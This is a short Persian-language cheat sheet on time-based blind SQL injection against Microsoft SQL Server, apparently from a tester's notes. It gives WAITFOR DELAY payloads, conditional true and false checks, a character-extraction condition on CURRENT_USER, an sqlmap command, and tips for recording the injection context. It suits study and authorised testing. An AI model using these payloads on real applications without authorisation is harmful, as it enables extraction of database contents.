---
tags: [web, sqli, time-based, mssql]
---

# MSSQL Time-Based

`WAITFOR DELAY` یک دستور Batch است؛ بنابراین کار کردن آن به Driver و امکان اجرای چند Statement بستگی دارد.

## تأخیر ساده در Context رشته‌ای

```sql
'; WAITFOR DELAY '0:0:5'--
```

## تأخیر شرطی

```sql
'; IF (1=1) WAITFOR DELAY '0:0:5'--
```

کنترل False:

```sql
'; IF (1=2) WAITFOR DELAY '0:0:5'--
```

## نمونه شرط روی کاراکتر

```sql
'; IF (ASCII(SUBSTRING(CURRENT_USER,1,1))>100) WAITFOR DELAY '0:0:5'--
```

## sqlmap

```bash
sqlmap -r request.txt -p id \
  --dbms=MicrosoftSQLServer --technique=T --time-sec=5 --batch
```

## نکات

- اگر Driver فقط یک Statement می‌پذیرد، این سبک پیلود ممکن است کار نکند.
- خطای Syntax را با نبود آسیب‌پذیری اشتباه نگیر.
- Context عددی، کوتیشن، پرانتز و Comment را جداگانه ثبت کن.

## یادداشت Context من

```text
Parameter:
Working prefix:
Working suffix:
Stacked statements allowed:
Delay observed:
```
